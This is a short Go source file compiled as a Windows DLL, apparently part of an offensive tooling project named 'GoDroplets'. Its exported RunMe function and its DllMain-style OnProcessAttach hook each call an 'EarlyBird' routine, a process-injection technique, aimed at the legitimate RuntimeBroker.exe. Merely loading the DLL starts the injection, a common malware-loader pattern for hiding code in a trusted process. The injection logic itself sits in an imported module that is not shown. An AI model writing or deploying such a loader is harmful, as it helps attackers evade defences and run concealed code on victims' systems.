package main

/*
#include <windows.h>
*/
import "C"
import (
	earlybird "GoDroplets/utils/EarlyBird"

)

//export RunMe
func RunMe() {
    earlybird.RunEarlyBird("C:\\Windows\\System32\\RuntimeBroker.exe")
}

//export OnProcessAttach
func OnProcessAttach(
	hinstDLL C.HINSTANCE, // handle to DLL module
	fdwReason C.DWORD, // reason for calling function
	lpReserved C.LPVOID, // reserved
) {
    earlybird.RunEarlyBird("C:\\Windows\\System32\\RuntimeBroker.exe")
}


func main() {
    
}

